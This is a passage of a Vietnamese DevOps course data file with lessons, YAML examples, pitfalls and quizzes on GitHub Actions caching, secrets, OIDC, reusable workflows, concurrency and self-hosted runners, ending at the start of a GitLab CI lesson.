          "Cache và artifact đều lưu file ngoài runner, nhưng mục đích khác nhau. Cache để tăng tốc: lưu thứ có thể tạo lại (thư mục npm cache, layer Docker), dùng lại giữa các lần chạy. Mất cache thì build chậm hơn chứ không sai. Artifact để truyền kết quả: báo cáo coverage, file build, SBOM; dùng giữa các job trong cùng một run, hoặc tải về để xem."
        ],
        list: [
          "`setup-node` với `cache: npm`: cách đơn giản nhất, tự tạo key theo `package-lock.json`.",
          "`actions/cache`: cache tuỳ ý với `key` và `restore-keys` do bạn tự định nghĩa.",
          "Docker layer cache `type=gha`: lưu layer vào cache của GitHub Actions qua Buildx.",
          "`actions/upload-artifact` / `download-artifact`: chuyển file giữa các job."
        ]
      },
      {
        h: "Ví dụ Docker cache và artifact",
        p: [
          "Lần build đầu tiên tải và build mọi layer. Từ lần thứ hai, layer không đổi (ví dụ layer `npm ci` khi lockfile không đổi) được lấy từ cache. `mode=max` lưu cả layer của các stage trung gian trong Dockerfile multi-stage."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/build.yml",
          src: `name: Build
on: push

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: dist
          path: dist/
          retention-days: 7
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: false
          cache-from: type=gha
          cache-to: type=gha,mode=max

  e2e:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: dist
          path: dist/
      - run: ls -la dist/`
        }
      },
      {
        h: "Thiết kế cache key",
        p: [
          "Với `actions/cache`, key nên chứa hash của file quyết định nội dung cache, ví dụ `hashFiles('**/package-lock.json')`, kèm hệ điều hành. `restore-keys` là tiền tố dự phòng: khi không khớp chính xác, lấy cache gần nhất có cùng tiền tố. Cache không bao giờ được chứa secret vì cache có thể được đọc bởi các workflow khác trong repo.",
          "Cache có giới hạn dung lượng theo repo và cache lâu không dùng sẽ bị xoá. Thứ tự Dockerfile cũng quan trọng: copy `package*.json` và chạy `npm ci` trước khi copy mã nguồn, để sửa code không làm mất cache của layer dependency."
        ]
      },
      {
        h: "Khi nào cần actions/cache",
        p: [
          "Cache của `setup-node` chỉ lưu thư mục cache của npm. Khi cần cache thứ khác, như cache build của Next.js, cache của Turborepo hay thư mục tải về của Playwright, bạn dùng `actions/cache` với key tự thiết kế, ví dụ `${{ runner.os }}-next-${{ hashFiles('**/package-lock.json') }}`. Nhớ pin action này theo commit SHA như mọi action khác.",
          "Cache có phạm vi theo nhánh: workflow của PR đọc được cache tạo ở nhánh đích như main, nhưng cache tạo trong PR chỉ dùng được trong PR đó. Vì vậy hãy để workflow trên main chạy thường xuyên để luôn có cache mới cho mọi PR."
        ]
      }
    ],
    summary: [
      "Cache tăng tốc giữa các lần chạy; artifact truyền kết quả giữa các job.",
      "`setup-node` với `cache: npm` là cách cache dependency đơn giản nhất.",
      "Docker layer cache dùng `cache-from/cache-to: type=gha` với Buildx.",
      "Cache key nên dựa trên hash lockfile; không bao giờ cache secret."
    ],
    pitfalls: [
      "Cache thư mục `node_modules` rồi dùng lại giữa các phiên bản Node, gây lỗi native module khó hiểu.",
      "Copy toàn bộ mã nguồn trước `npm ci` trong Dockerfile, mỗi lần sửa code là mất cache dependency.",
      "Dùng artifact với retention mặc định cho file lớn, tốn dung lượng lưu trữ."
    ],
    quiz: [
      {
        q: "Bạn cần chuyển thư mục `dist/` từ job build sang job e2e. Dùng gì?",
        options: ["actions/cache", "upload-artifact rồi download-artifact", "Biến môi trường", "Job outputs"],
        answer: 1,
        explain: "Artifact là cơ chế truyền file giữa các job trong một run. Cache có thể bị xoá và không đảm bảo; outputs chỉ dành cho chuỗi ngắn."
      },
      {
        q: "`cache-to: type=gha,mode=max` khác `mode=min` ở điểm nào?",
        options: ["max nén mạnh hơn", "max lưu cả layer của các stage trung gian", "max chỉ lưu stage cuối", "Không khác"],
        answer: 1,
        explain: "mode=max xuất cache cho mọi layer, gồm cả stage trung gian của multi-stage build; mode=min chỉ lưu layer của image kết quả."
      },
      {
        q: "Cache key tốt cho npm dependency nên dựa trên gì?",
        options: ["Thời gian hiện tại của runner","Tên người tạo commit","Số thứ tự của lần chạy","Hash của package-lock.json và hệ điều hành"],
        answer: 3,
        explain: "Lockfile quyết định nội dung dependency nên hash của nó là key chính xác. Thời gian hay số run khiến cache không bao giờ khớp."
      }
    ]
  },
  "p08.m1.t5": {
    videos: [
      { id: "w_37LDOy4sI", title: "GitHub Actions: Approvals, Environments and Visualization DEEP DIVE", channel: "CoderDave", lang: "en", minutes: 14, embed: true }
    ],
    sections: [
      {
        h: "Secret, variable và environment",
        p: [
          "GitHub Actions có hai loại giá trị cấu hình. Secret được mã hoá, bị che thành `***` trong log, dùng cho mật khẩu, token, khoá API; đọc bằng `secrets.TEN`. Variable là giá trị không nhạy cảm như region, tên cluster, URL; hiện rõ trong log, đọc bằng `vars.TEN`. Đừng để thứ không bí mật vào secret, vì như vậy log bị che khắp nơi và khó debug.",
          "Cả hai có thể đặt ở ba cấp: organization, repository và environment. Cấp càng hẹp thì ưu tiên càng cao. Environment là cấp quan trọng nhất cho CD: secret của environment `production` chỉ được cấp cho job khai báo `environment: production`, và chỉ sau khi các quy tắc bảo vệ của environment đó được thoả."
        ]
      },
      {
        h: "Environment protection rules",
        p: [
          "Trong Settings → Environments, mỗi environment có thể cấu hình các quy tắc sau. Kết hợp chúng, bạn có một cổng production chặt chẽ mà không cần công cụ ngoài.",
          "Lưu ý về gói dịch vụ: với repo public, mọi gói đều dùng được các quy tắc này. Với repo private trên gói Free, Pro hoặc Team, Required reviewers và Wait timer không dùng được (cần GitHub Enterprise); Deployment branches and tags thì có từ gói Pro/Team. Hãy kiểm tra gói của tổ chức trước khi thiết kế cổng duyệt."
        ],
        list: [
          "Required reviewers: tối đa 6 người hoặc team; job chờ một người trong số đó duyệt.",
          "Prevent self-review: người kích hoạt deploy không được tự duyệt.",
          "Wait timer: chờ một khoảng thời gian trước khi deploy (1 phút tới 30 ngày).",
          "Deployment branches and tags: chỉ nhánh `main` hoặc tag `v*` mới được deploy vào production.",
          "Secret và variable riêng cho environment."
        ]
      },
      {
        h: "Ví dụ job deploy dùng environment",
        p: [
          "Job dưới đây chỉ nhận `DB_MIGRATION_URL` của production khi đã được duyệt. Khai báo `url` giúp giao diện GitHub hiển thị liên kết tới môi trường vừa deploy."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/deploy-prod.yml",
          src: `name: Deploy production
on:
  workflow_dispatch:
    inputs:
      image_tag:
        type: string
        required: true

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://api.example.com
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Migration
        env:
          DATABASE_URL: \${{ secrets.DB_MIGRATION_URL }}   # secret cấp environment
        run: ./scripts/migrate.sh
      - name: Deploy
        env:
          CLUSTER: \${{ vars.ECS_CLUSTER }}                # variable, không nhạy cảm
          IMAGE_TAG: \${{ inputs.image_tag }}
        run: ./scripts/ecs-deploy.sh "$CLUSTER" "$IMAGE_TAG"`
        }
      },
      {
        h: "Giới hạn và thực hành tốt",
        p: [
          "Việc che secret trong log chỉ khớp chuỗi nguyên văn. Nếu secret bị biến đổi (base64, cắt chuỗi, JSON nhiều dòng) thì có thể lộ ra. Không in secret, không ghi nó vào artifact hay cache. Secret không được truyền cho workflow chạy từ PR fork, và `GITHUB_TOKEN` ở đó chỉ có quyền đọc.",
          "Tốt nhất là giảm số secret dài hạn: dùng OIDC để lấy credential cloud tạm thời (bài tiếp theo), và dùng secret manager của cloud cho secret của ứng dụng lúc chạy. Secret trong GitHub khi đó chỉ còn vài thứ thật sự cần."
        ]
      }
    ],
    summary: [
      "Secret cho giá trị nhạy cảm (bị che trong log), variable cho giá trị thường.",
      "Có ba cấp: organization, repository, environment; cấp hẹp hơn được ưu tiên.",
      "Environment protection: required reviewers, prevent self-review, wait timer, giới hạn nhánh.",
      "Secret của environment chỉ được cấp cho job đã qua quy tắc bảo vệ."
    ],
    pitfalls: [
      "Để secret production ở cấp repository: mọi workflow, mọi nhánh đều đọc được.",
      "Cho phép mọi nhánh deploy vào environment production, ai tạo nhánh cũng có thể kích hoạt deploy.",
      "In secret đã qua biến đổi (base64) ra log, cơ chế che không nhận ra."
    ],
    quiz: [
      {
        q: "Giá trị `AWS_REGION=ap-southeast-1` nên lưu ở đâu?",
        options: ["Secret", "Variable", "Hard-code trong Dockerfile", "Commit vào file .env"],
        answer: 1,
        explain: "Region không nhạy cảm nên để trong variable để log dễ đọc. Hard-code hay commit .env làm config khó thay đổi."
      },
      {
        q: "Secret đặt ở environment `production` được cấp cho job nào?",
        options: ["Mọi job của mọi workflow trong repo","Job có `environment: production` đã được duyệt","Mọi job chạy theo lịch `schedule`","Mọi job chạy trên nhánh main"],
        answer: 1,
        explain: "Secret cấp environment chỉ được cấp cho job dùng environment đó, sau khi qua quy tắc bảo vệ. Chạy trên main hay theo lịch là chưa đủ; PR từ fork cũng không nhận secret."
      },
      {
        q: "Tính năng nào ngăn người kích hoạt deploy tự duyệt deploy của chính mình?",
        options: ["Wait timer", "Prevent self-review", "Deployment branches", "Concurrency"],
        answer: 1,
        explain: "Prevent self-review buộc một người khác duyệt. Wait timer chỉ trì hoãn; deployment branches giới hạn nhánh."
      }
    ]
  },
  "p08.m1.t6": {
    videos: [
      { id: "Io5UFJlEJKc", title: "Securely deploy to AWS with GitHub Actions and OIDC", channel: "GitHub", lang: "en", minutes: 17, embed: true }
    ],
    sections: [
      {
        h: "Vấn đề của access key dài hạn",
        p: [
          "Cách cũ là tạo IAM user, sinh `AWS_ACCESS_KEY_ID` và `AWS_SECRET_ACCESS_KEY`, dán vào GitHub secret. Key này sống mãi cho tới khi ai đó nhớ xoay vòng. Nếu bị lộ qua log, qua một action độc hại hay qua máy của một developer, kẻ tấn công dùng được nó từ bất kỳ đâu, bất kỳ lúc nào.",
          "OIDC (OpenID Connect) giải quyết bằng cách không có key nào cả. Mỗi lần job chạy, GitHub cấp một token JWT (chuỗi JSON được ký số, ai cũng kiểm tra được chữ ký) ngắn hạn, ký bởi `https://token.actions.githubusercontent.com`, trong đó ghi rõ repo, nhánh, environment, workflow. AWS kiểm tra chữ ký và các claim, rồi trả về credential tạm thời có hạn khoảng một giờ."
        ]
      },
      {
        h: "Luồng hoạt động",
        list: [
          "Một lần duy nhất: tạo OIDC identity provider trong AWS IAM và một IAM role có trust policy.",
          "Trust policy chỉ tin token có `aud` là `sts.amazonaws.com` và `sub` khớp repo, environment cụ thể.",
          "Job khai báo `permissions: id-token: write` để được phép xin token OIDC.",
          "Action `configure-aws-credentials` đổi token lấy credential tạm thời qua `sts:AssumeRoleWithWebIdentity`.",
          "Các step sau dùng AWS CLI/SDK như bình thường."
        ],
        p: [
          "Claim `sub` có dạng như `repo:my-org/task-api:environment:production` khi job dùng environment, hoặc `repo:my-org/task-api:ref:refs/heads/main` khi không dùng environment. Nhờ vậy bạn có thể tạo role production chỉ cho environment production assume."
        ]
      },
      {
        h: "Ví dụ workflow",
        p: [
          "Thiếu `id-token: write` là lỗi phổ biến nhất: action sẽ báo không lấy được token. Lưu ý khi khai báo `permissions` ở job, mọi quyền không liệt kê đều về `none`, nên hãy thêm `contents: read` để checkout được."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/deploy.yml",
          src: `name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write   # bắt buộc để xin token OIDC
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: \${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ap-southeast-1
      - run: aws sts get-caller-identity`
        }
      },
      {
        h: "Không chỉ AWS",
        p: [
          "Google Cloud (Workload Identity Federation), Azure (federated credential), HashiCorp Vault và nhiều registry đều hỗ trợ OIDC từ GitHub Actions. GitLab CI cũng có cơ chế tương tự qua `id_tokens`. Nguyên tắc luôn giống nhau: tin danh tính do nền tảng CI ký, ràng buộc thật chặt các claim, cấp quyền tối thiểu cho role.",
          "Role deploy chỉ nên có quyền đúng việc cần làm, ví dụ cập nhật một ECS service và đẩy image lên một repository ECR, không phải `AdministratorAccess`."
        ]
      }
    ],
    summary: [
      "OIDC thay access key dài hạn bằng credential tạm thời cho mỗi lần chạy.",
      "Job cần `permissions: id-token: write`.",
      "Trust policy phải ràng buộc `aud` và `sub` (repo, environment) thật chặt.",
      "IAM role chỉ cấp quyền tối thiểu cho việc deploy."
    ],
    pitfalls: [
      "Trust policy dùng `repo:my-org/*` hoặc bỏ điều kiện `sub`: repo khác, thậm chí PR, cũng assume được role production.",
      "Quên `id-token: write`, hoặc khai báo permissions ở job mà quên `contents: read`.",
      "Vẫn giữ access key cũ trong secret sau khi chuyển sang OIDC."
    ],
    quiz: [
      {
        q: "Quyền nào bắt buộc để job xin được token OIDC từ GitHub?",
        options: ["contents: write", "id-token: write", "packages: write", "actions: read"],
        answer: 1,
        explain: "`id-token: write` cho phép job yêu cầu JWT OIDC. Các quyền khác không liên quan đến việc cấp token."
      },
      {
        q: "Lợi ích chính của OIDC so với access key lưu trong secret?",
        options: ["Workflow chạy nhanh hơn đáng kể","Không cần tạo IAM role trên AWS","Không còn credential dài hạn phải lưu","Không cần viết trust policy"],
        answer: 2,
        explain: "OIDC loại bỏ key dài hạn và ràng buộc danh tính theo claim. Nó vẫn cần IAM role và trust policy."
      },
      {
        q: "Điều kiện `sub` nào an toàn nhất cho role deploy production?",
        options: ["repo:my-org/*", "*", "repo:my-org/task-api:environment:production", "repo:*:ref:refs/heads/main"],
        answer: 2,
        explain: "Giới hạn đúng repo và environment production. Các lựa chọn có dấu sao cho phép quá nhiều nguồn assume role."
      }
    ]
  },
  "p08.m1.t7": {
    videos: [
      { id: "zc19mR3O4a4", title: "Composite Actions VS Reusable Workflows in GitHub Actions [2023 Update]", channel: "CoderDave", lang: "en", minutes: 5, embed: true }
    ],
    sections: [
      {
        h: "Hai cách tái sử dụng",
        p: [
          "Khi công ty có hàng chục repo, copy cùng một file CI vào mọi nơi sẽ nhanh chóng lệch nhau. GitHub Actions có hai cơ chế tái sử dụng với phạm vi khác nhau."
        ],
        list: [
          "Reusable workflow (`on: workflow_call`): tái sử dụng cả một workflow gồm nhiều job, có environment, có runner riêng. Gọi ở cấp job: `jobs.x.uses: org/repo/.github/workflows/file.yml@ref`.",
          "Composite action (`runs.using: composite`): gói nhiều step thành một step. Gọi ở cấp step: `steps[].uses: org/repo/path@ref`. Chạy trên runner của job gọi nó.",
          "Quy tắc chọn: cần chuẩn hoá cả quy trình (build, scan, deploy có duyệt) thì dùng reusable workflow; cần gom vài step lặp lại (setup Node, cài dependency) thì dùng composite action."
        ]
      },
      {
        h: "Ví dụ composite action",
        p: [
          "Composite action đặt trong file `action.yml`. Mỗi step `run` trong composite phải khai báo `shell`."
        ],
        code: {
          lang: "yaml",
          file: ".github/actions/setup-app/action.yml",
          src: `name: Setup app
description: Cài Node, khôi phục cache và cài dependency
inputs:
  node-version:
    description: Phiên bản Node
    default: "24"
runs:
  using: composite
  steps:
    - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
      with:
        node-version: \${{ inputs.node-version }}
        cache: npm
    - run: npm ci
      shell: bash`
        }
      },
      {
        h: "Gọi reusable workflow từ repo dùng chung",
        p: [
          "Repo `my-org/ci-templates` chứa workflow chuẩn. Các repo dịch vụ chỉ cần vài dòng. `secrets: inherit` chuyển toàn bộ secret của repo gọi sang, tiện nhưng rộng; truyền từng secret tường minh an toàn hơn. Tham chiếu tới workflow dùng chung cũng nên pin theo commit SHA, giống như action."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read
  packages: write

jobs:
  node-ci:
    # Thay <commit-sha> bằng SHA đầy đủ 40 ký tự của bản bạn muốn dùng
    uses: my-org/ci-templates/.github/workflows/node-service.yml@<commit-sha> # v3.2.0
    with:
      node-version: "24"
      run-integration: true
    secrets:
      SONAR_TOKEN: \${{ secrets.SONAR_TOKEN }}

  lint-local:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: ./.github/actions/setup-app
      - run: npm run lint`
        }
      },
      {
        h: "Versioning và pin theo SHA",
        p: [
          "Action và workflow dùng chung cần được version như thư viện: tag `v1.2.0`, changelog, không phá vỡ input cũ. Nhưng phía người dùng thì nên pin theo commit SHA đầy đủ, vì tag trong Git có thể bị di chuyển. Ngày 19/3/2026, kẻ tấn công dùng credential bị lộ để force-push 76/77 tag của `aquasecurity/trivy-action` thành mã độc đánh cắp secret. Workflow pin trivy-action theo SHA không nhận mã độc từ chính action đó. Nhưng pin SHA chỉ bảo vệ đúng một tầng: các commit trivy-action cũ (trước 9/4/2025) bên trong lại gọi `setup-trivy` theo tag, mà tag của `setup-trivy` cũng bị ghi đè, nên vẫn nhiễm. Khi chọn action, hãy xem cả những action mà nó gọi bên trong.",
          "Để việc pin SHA không thành gánh nặng, bật Dependabot cho ecosystem `github-actions`: nó mở PR cập nhật SHA và giữ comment version bên cạnh."
        ]
      },
      {
        h: "Đừng trừu tượng hoá quá sớm",
        p: [
          "Tái sử dụng có giá: workflow dùng chung càng nhiều tham số thì càng khó đọc, khó debug, và mỗi thay đổi ảnh hưởng tới mọi repo. Hãy bắt đầu bằng việc copy khi mới có hai, ba repo; khi đã thấy rõ phần chung ổn định thì mới tách ra thành reusable workflow.",
          "Workflow dùng chung nên có test riêng (một repo mẫu chạy nó mỗi khi có thay đổi), có changelog, và phát hành theo version để các repo nâng cấp dần chứ không bị ép cùng lúc."
        ]
      }
    ],
    summary: [
      "Reusable workflow tái sử dụng cả quy trình nhiều job; composite action gom nhiều step.",
      "Composite action: step `run` phải có `shell`.",
      "Truyền secret tường minh thay vì `secrets: inherit` khi có thể.",
      "Pin action và workflow dùng chung theo commit SHA, cập nhật bằng Dependabot."
    ],
    pitfalls: [
      "Tham chiếu `@main` tới workflow dùng chung: một commit lỗi ở repo template làm hỏng CI của mọi repo.",
      "Quên `shell: bash` trong step của composite action.",
      "Dùng `secrets: inherit` cho workflow bên thứ ba, trao toàn bộ secret cho code bạn không kiểm soát."
    ],
    quiz: [
      {
        q: "Bạn muốn chuẩn hoá quy trình build, scan và deploy có duyệt cho 30 repo. Nên dùng gì?",
        options: ["Composite action", "Reusable workflow", "Copy file workflow", "Script bash"],
        answer: 1,
        explain: "Reusable workflow chứa được nhiều job, environment và quy tắc duyệt. Composite action chỉ là một nhóm step trong một job."
      },
      {
        q: "Vì sao nên pin action theo commit SHA thay vì tag?",
        options: ["SHA ngắn hơn và dễ đọc hơn tag","Tag có thể bị force-push, SHA thì không","GitHub không còn hỗ trợ tham chiếu theo tag","Action pin theo SHA chạy nhanh hơn"],
        answer: 1,
        explain: "Sự cố trivy-action 3/2026 là ví dụ tag bị ghi đè thành mã độc. SHA trỏ tới đúng một commit nên không thể bị thay; nhưng nếu action đó lại gọi action khác theo tag thì tầng bên trong vẫn có rủi ro."
      },
      {
        q: "Trong composite action, step `run` bắt buộc phải có gì?",
        options: ["`shell`", "`id`", "`env`", "`if`"],
        answer: 0,
        explain: "Composite action yêu cầu khai báo `shell` cho mỗi step run. Các thuộc tính khác là tuỳ chọn."
      }
    ]
  },
  "p08.m1.t8": {
    videos: [
      { id: "aLHyPZO0Fy0", title: "GitHub Actions Selfhosted Runners | easy devops tutorial ci/cd", channel: "Tech with Marco", lang: "en", minutes: 8, embed: true }
    ],
    sections: [
      {
        h: "Concurrency: huỷ run cũ, tránh deploy chồng nhau",
        p: [
          "Khi bạn push ba commit liên tiếp vào một PR, mặc định có ba run CI chạy song song, hai run đầu là lãng phí. Khối `concurrency` gom các run vào một nhóm; trong một nhóm chỉ có một run đang chạy và tối đa một run chờ.",
          "Với CI của PR, đặt `cancel-in-progress: true` để huỷ run cũ. Với deploy thì ngược lại: không nên huỷ một deploy đang chạy giữa chừng vì có thể để hệ thống ở trạng thái dở dang. Hãy dùng nhóm theo môi trường với `cancel-in-progress: false` để deploy đang chạy được làm xong.",
          "Cần hiểu đúng chữ \"xếp hàng\": mặc định (`queue: single`) nhóm chỉ giữ một run chờ. Nếu đang có run chờ mà run thứ ba tới, run chờ cũ bị huỷ và run mới thế chỗ. Với deploy, điều này thường hợp lý vì chỉ bản mới nhất cần lên. Nếu muốn mọi run đều được chạy lần lượt, GitHub hỗ trợ `queue: max` (tối đa 100 run chờ, xử lý gần đúng theo thứ tự vào hàng); `queue: max` không được kết hợp với `cancel-in-progress: true`."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-\${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: \${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm ci && npm test

  deploy:
    if: github.event_name == 'push'
    needs: test
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-production
      cancel-in-progress: false   # không huỷ deploy đang chạy
      # queue: max                # bỏ comment nếu muốn giữ mọi run chờ thay vì chỉ run mới nhất
    steps:
      - run: echo "deploy"`
        }
      },
      {
        h: "Khi nào cần self-hosted runner",
        list: [
          "Cần truy cập mạng nội bộ: database, Kubernetes API private, hệ thống on-premise.",
          "Build nặng cần nhiều CPU, RAM, GPU hoặc kiến trúc ARM riêng.",
          "Yêu cầu tuân thủ: dữ liệu và mã nguồn không được rời hạ tầng công ty.",
          "Chi phí: khối lượng build rất lớn, tự vận hành rẻ hơn tính theo phút."
        ],
        p: [
          "Job chọn runner qua label, ví dụ `runs-on: [self-hosted, linux, x64, build-heavy]`. Trên Kubernetes, Actions Runner Controller (ARC) tạo runner tạm thời theo nhu cầu, mỗi job một pod mới rồi xoá, đỡ phải quản lý máy thủ công."
        ]
      },
      {
        h: "Rủi ro bảo mật của self-hosted",
        p: [
          "Runner của GitHub là máy ảo mới cho mỗi job rồi bị huỷ. Self-hosted runner mặc định thì được dùng lại: file, credential, tiến trình còn sót từ job trước có thể bị job sau đọc. Nếu repo công khai cho phép PR từ fork chạy trên self-hosted runner, bất kỳ ai cũng có thể chạy code trong mạng nội bộ của bạn.",
          "Vì vậy: không dùng self-hosted runner cho repo public; ưu tiên runner ephemeral (chạy một job rồi huỷ); chia runner group theo mức tin cậy, runner có quyền vào production chỉ phục vụ repo và workflow được chỉ định; và không lưu credential dài hạn trên máy runner."
        ]
      }
    ],
    summary: [
      "`concurrency` gom run theo nhóm; `cancel-in-progress` huỷ run cũ.",
      "CI của PR nên huỷ run cũ; deploy nên xếp hàng, không huỷ giữa chừng.",
      "Self-hosted runner cho mạng nội bộ, máy mạnh, tuân thủ hoặc tiết kiệm chi phí.",
      "Ưu tiên runner ephemeral (ARC), không dùng self-hosted cho repo public."
    ],
    pitfalls: [
      "Đặt `cancel-in-progress: true` cho deploy production, làm deploy bị cắt ngang và hệ thống ở trạng thái dở.",
      "Group concurrency không chứa `github.ref`, khiến các PR khác nhau huỷ lẫn nhau.",
      "Self-hosted runner dùng lại lâu dài, tích tụ credential và file từ các job cũ."
    ],
    quiz: [
      {
        q: "Với workflow deploy production, cấu hình concurrency nào hợp lý?",
        options: ["Nhóm theo `github.ref`, cancel-in-progress: true","Nhóm cố định theo môi trường, cancel-in-progress: false","Không dùng concurrency, cho các deploy chạy song song","Nhóm theo người commit, cancel-in-progress: true"],
        answer: 1,
        explain: "Deploy nên xếp hàng theo môi trường và không bị huỷ giữa chừng. Chạy song song dễ gây deploy chồng nhau."
      },
      {
        q: "Vì sao không nên dùng self-hosted runner cho repo public?",
        options: ["Vì GitHub tính phí cao hơn cho repo public","Vì self-hosted runner không hỗ trợ Linux","Vì repo public không gán được label runner","Vì PR từ fork có thể chạy code trên máy của bạn"],
        answer: 3,
        explain: "Code không tin cậy chạy trên máy của bạn là rủi ro lớn nhất. Các lựa chọn còn lại không đúng."
      },
      {
        q: "Actions Runner Controller (ARC) mang lại lợi ích gì?",
        options: ["Tạo runner tạm thời trên Kubernetes theo nhu cầu","Thay GitHub Actions bằng Jenkins chạy trên cluster","Tăng số phút miễn phí của GitHub-hosted runner","Tự sinh workflow YAML từ cấu trúc repo"],
        answer: 0,
        explain: "ARC tự co giãn runner dạng pod trên Kubernetes, mỗi job dùng runner mới. Nó không thay thế GitHub Actions hay tăng phút miễn phí."
      }
    ]
  },
  "p08.m2.t0": {
    videos: [
      { id: "IV5MQUEUx44", title: "GitLab for Everyone: Your First CI/CD Pipeline Explained", channel: "GitLab", lang: "en", minutes: 10, embed: true },
      { id: "z7nLsJvEyMY", title: "GitLab CI/CD Pipeline Tutorial for Beginners", channel: "Valentin Despa", lang: "en", minutes: 20, embed: true }
    ],
    sections: [
      {
        h: "Cấu trúc .gitlab-ci.yml",
        p: [
          "GitLab CI dùng một file `.gitlab-ci.yml` ở gốc repo. Mỗi khoá cấp cao không phải từ khoá dành riêng (như `stages`, `default`, `workflow`, `variables`, `include`) là một job; khoá bắt đầu bằng dấu chấm như `.node-template` là hidden job, không chạy, thường dùng làm mẫu để job khác `extends`. Job thuộc về một `stage`; mặc định các stage chạy tuần tự, các job cùng stage chạy song song. Job được thực thi bởi GitLab Runner, một agent bạn cài trên máy hoặc Kubernetes, hoặc runner dùng chung của GitLab.com.",
          "Khái niệm tương ứng với GitHub Actions khá thẳng: job giống job, `script` giống các step `run`, `services` giống service container, `environment` giống environment, và `needs` tạo phụ thuộc trực tiếp giữa các job."
        ],
        list: [
          "`rules:` quyết định job có chạy không, thay cho `only/except` cũ.",
          "`needs:` tạo DAG (đồ thị phụ thuộc có hướng): job chạy ngay khi job nó cần xong, không chờ cả stage.",
          "`artifacts:` lưu file giữa các job, có `expire_in` và `reports` (junit, coverage).",
          "`cache:` tăng tốc, key có thể dựa theo file lockfile.",
          "`environment:` ghi nhận deploy, hỗ trợ protected environment và duyệt."
        ]
      },
      {
        h: "Ví dụ với workflow rules và DAG",
        p: [
          "Khối `workflow: rules:` dưới đây là mẫu phổ biến để tránh pipeline chạy hai lần (một cho branch, một cho merge request). Job `build` dùng `needs` nên chạy ngay khi `test` xong, không cần chờ `lint`."
        ],
        code: {
          lang: "yaml",
          file: ".gitlab-ci.yml",
          src: `workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never
    - if: $CI_COMMIT_BRANCH

stages: [test, build, deploy]

default:
  image: node:24-alpine
  interruptible: true

lint:
  stage: test
  script:
    - npm ci --cache .npm --prefer-offline
    - npm run lint
  cache:
    key:
      files: [package-lock.json]
    paths: [.npm/]

test:
  stage: test
  script:
    - npm ci --cache .npm --prefer-offline
    - npm test
  artifacts:
    when: always
    expire_in: 1 week
    reports:
      junit: reports/junit.xml

build:
  stage: build
  needs: [test]
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  script:
    - echo "build image $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA"

deploy_production:
  stage: deploy
  needs: [build]
  interruptible: false
  environment:
    name: production
    url: https://example.com
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
  script:
    - ./scripts/deploy.sh production`
        }
      },
      {
        h: "GitLab Runner và bảo mật",
        p: [
          "Runner có nhiều executor: `docker` (mỗi job một container, phổ biến nhất), `shell` (chạy thẳng trên máy, ít cô lập), `kubernetes` (mỗi job một pod). Từ GitLab 16, runner được tạo trên giao diện và đăng ký bằng runner authentication token có tiền tố `glrt-`, thay cho registration token cũ.",
          "Variable có thể đánh dấu Protected (chỉ cấp cho nhánh, tag được bảo vệ) và Masked (che trong log). Secret production nên luôn là Protected, kết hợp protected environment để chỉ một nhóm người được chạy job deploy. Protected environment còn hỗ trợ deployment approvals: deploy phải được số người duyệt quy định chấp thuận, gần nhất với Required reviewers của GitHub. Cả hai tính năng này cần gói Premium hoặc Ultimate; trên gói Free, bạn chỉ có `when: manual` kết hợp Protected branch và Protected variable. `interruptible: true` cùng tuỳ chọn tự huỷ pipeline dư thừa giúp huỷ pipeline cũ khi có commit mới, tương tự concurrency của GitHub."
        ]
      }
    ],
    summary: [
      "Job thuộc stage; stage chạy tuần tự, job cùng stage chạy song song.",
      "Dùng `rules:` thay `only/except`, và `workflow: rules:` để tránh pipeline trùng.",
      "`needs:` tạo DAG giúp pipeline nhanh hơn.",
      "Variable Protected + protected environment để bảo vệ deploy production."
    ],
    pitfalls: [
      "Không có `workflow: rules:`, mỗi push vào nhánh có MR tạo hai pipeline.",
